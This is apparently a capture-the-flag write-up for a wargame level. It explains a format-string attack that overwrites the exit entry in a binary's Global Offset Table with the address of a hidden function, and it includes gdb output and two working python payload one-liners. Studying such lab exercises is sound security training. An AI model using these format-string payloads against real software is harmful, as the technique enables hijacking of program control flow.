# level5

In this level, we discover the concept of GOT, not *Game Of Thrones* but `Global Offset Table`. It's like a phonebook with external libraries functions addresses.

There are three functions, including `main`, which only calls the second one, called `n` and a function which is never called named `o` with a syscall.  
The `n` function takes input from `stdin` (no overflow possible), and calls printf with it. Again this is an unprotected `printf` call. The noticable thing is the call to `exit`. And this is the exit function that we can exploit.  

The goal is to write the address of `o` in place of `exit` in the GOT. So, we need to search for `o` address and `exit` GOT address :

```
info functions
All defined functions:
[...]
0x080484a4  o
^^^^^^^^^^
[...]

(gdb) disas n 
Dump of assembler code for function n:
 [...]
   0x080484ff <+61>:	call   0x80483d0 <exit@plt>
                                         ^^^^^^^^^^

(gdb) x/i 'exit@plt'
   0x80483d0 <exit@plt>:	jmp    *0x8049838
                                       ^^^^^^^^^^
```

Now that we have them, we just need craft the printf payload in the same manner as the last exercise, knowing that the fourth argument is the buffer. We just need to write the two last bytes because the first two are the same. 

#### The 🗑️ ugly way 🗑️

```bash
python -c 'print "\x08\x04\x98\x38"[::-1] + "%33952p%4$hn"' > /tmp/5 && cat /tmp/5 - | ./level5
```

#### The ✨ cooler way ✨

```bash
python -c 'print "\x08\x04\x98\x39"[::-1] + "\x08\x04\x98\x38"[::-1] + "%124p%4$hhn%32p%5$hhn"' > /tmp/5 && cat /tmp/5 - | ./level5
```
